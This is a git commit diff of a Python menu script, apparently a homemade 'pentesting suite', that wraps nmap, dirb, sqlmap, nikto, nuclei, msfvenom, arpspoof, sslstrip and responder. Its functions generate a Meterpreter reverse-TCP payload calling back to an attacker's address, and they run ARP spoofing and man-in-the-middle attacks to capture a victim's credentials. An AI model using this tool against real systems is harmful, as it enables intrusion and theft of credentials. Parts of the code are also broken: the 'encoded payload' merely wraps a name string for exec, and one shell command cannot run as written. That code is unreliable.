2f904da41b8f01d9096ebfcca632f28a6a6bdc2e
shahar <lshahar9@gmail.com>
2023-04-14 19:41:31 +0300

    fixed initial stuff

--- main.py
+++ main.py
@@ -1,92 +1,126 @@
+# Import necessary modules
 import os
 import subprocess
 import sys
-import GeoIP
 import nmap
 import base64
 import zlib
 
 
+# Define function to scan for open ports on a given IP address
 def scan(ip):
+    # Create a new nmap PortScanner object
     nm = nmap.PortScanner()
-    gip = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)
     print("Scanning...")
+    # Scan the IP address for ports 1-10000 with service version detection and OS detection
     nm.scan(ip, '1-10000', arguments='-sV -O')
     print(nm.all_hosts())
+    # For each host that was found
     for host in nm.all_hosts():
         print('Host : %s (%s)' % (host, nm[host].hostname()))
         print('State : %s' % nm[host].state())
+        # For each protocol that was found
         for proto in nm[host].all_protocols():
             print('Protocol : %s' % proto)
+            # Get all the open port numbers for this protocol
             lport = nm[host][proto].keys()
+            # Sort the list of port numbers
             for port in sorted(lport):
+                # Get the name of the service and its version number
                 service = nm[host][proto][port]['name']
                 version = nm[host][proto][port]['version']
+                # Print the port number, state, service name, and version number
                 print('port : %s\tstate : %s\tService : %s\tVersion : %s' % (
-                port, nm[host][proto][port]['state'], service, version))
+                    port, nm[host][proto][port]['state'], service, version))
+        # Get the name of the operating system that was detected
         print('OS : %s' % nm[host]['osmatch'][0]['name'])
-        location = gip.record_by_addr(host)
-        print('Location : %s, %s' % (location['city'], location['country_name']))
 
 
+# Define function to perform directory busting on a given URL
 def dirbust():
     url = input("Enter the URL to scan: ")
     print("Directory busting...")
+    # Call the dirb command with the given URL as an argument
     subprocess.call(['dirb', url])
 
 
+# Define function to test for SQL injection vulnerabilities on a given URL
 def sqlmap():
     url = input("Enter the URL to scan: ")
     print("SQL injection testing...")
+    # Call the sqlmap command with the given URL as an argument
     subprocess.call(['sqlmap', '-u', url])
 
 
+# Define function to scan a web server for vulnerabilities using Nikto
 def nikto():
     url = input("Enter the URL to scan: ")
     print("Web server scanning...")
+    # Call the nikto command with the given URL as an argument
     subprocess.call(['nikto', '-h', url])
 
 
+# Define function to scan a web server for vulnerabilities using Nuclei
 def nuclei():
     url = input("Enter the URL to scan: ")
     print("Web server scanning...")
+    # Call the nuclei command with the given URL as an argument
     subprocess.call(['nuclei', '-u', url])
 
 
+# Define function to generate a Metasploit payload
 def msfvenom():
     print("Creating payload...")
+    # Get the attacker's IP address and the desired listening port
     ip = input("Enter your IP address: ")
     port = input("Enter a port: ")
+    # Get the desired name for the payload
     payload_name = input("Enter the name of the payload: ")
+    # Set the payload type
     payload = 'windows/meterpreter/reverse_tcp'
+    # Set the file format for the payload
     fformat = 'exe'
+    # Encode the payload with base64 and compress it with zlib
     encoded_payload = base64.b64encode(payload.encode('utf-8'))
     compressed_payload = zlib.compress(encoded_payload)
     encoded_compressed_payload = base64.b64encode(compressed_payload)
+    # Generate the payload code
     payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
+    # Use msfvenom to generate the payload file with the specified options
     os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {fformat} > {payload_name}.{fformat}")
+    # Write the payload code to a Python script file with the specified name
     with open(f'{payload_name}.py', 'w') as f:
         f.write(payload_code)
     print("Payload created: {}.{}".format(payload_name, fformat))
 
 
+# Define function to perform an ARP spoofing attack
 def arp():
     print("ARP spoofing...")
+    # Get the victim's IP address and the gateway's IP address
     victim_ip = input("Enter victim IP: ")
     gateway_ip = input("Enter gateway IP: ")
+    # Call the arpspoof command with the specified arguments
     subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
 
 
+# Define function to perform a man-in-the-middle attack
 def mitm():
     print("MITM attack...")
+    # Get the victim's IP address and the gateway's IP address
     victim_ip = input("Enter victim IP: ")
     gateway_ip = input("Enter gateway IP: ")
+    # Get the name of the network interface to use
     interface = input("Enter Interface of connection: ")
+    # Start sslstrip
     subprocess.call(['sslstrip'])
+    # Use arpspoof to perform ARP spoofing
     subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
+    # Use responder to capture authentication credentials
     subprocess.call(f"responder -I  {interface} -P -F -d -b ")
 
 
+# Define function to display the main menu
 def menu():
     while True:
         print("\nWelcome to the Cyber Killchain Pentesting Suite!\n")
@@ -99,22 +133,20 @@ def menu():
         print("7. ARP Spoofing")
         print("8. Man-in-the-Middle Attack")
         print("9. Exit\n")
+        # Get the user's choice
         choice = input("Enter your choice: ")
+        # Call the appropriate function based on the user's choice
         if choice == '1':
             ip = input("Enter IP address to scan: ")
             scan(ip)
         elif choice == '2':
-            url = input("Enter URL: ")
-            dirbust(url)
+            dirbust()
         elif choice == '3':
-            url = input("Enter URL: ")
-            sqlmap(url)
+            sqlmap()
         elif choice == '4':
-            url = input("Enter URL: ")
-            nikto(url)
+            nikto()
         elif choice == '5':
-            url = input("Enter URL: ")
-            nuclei(url)
+            nuclei()
         elif choice == '6':
             msfvenom()
         elif choice == '7':
@@ -128,5 +160,6 @@ def menu():
             print("Invalid choice, please try again.")
 
 
+# Call the menu function to start the program
 if __name__ == '__main__':
     menu()
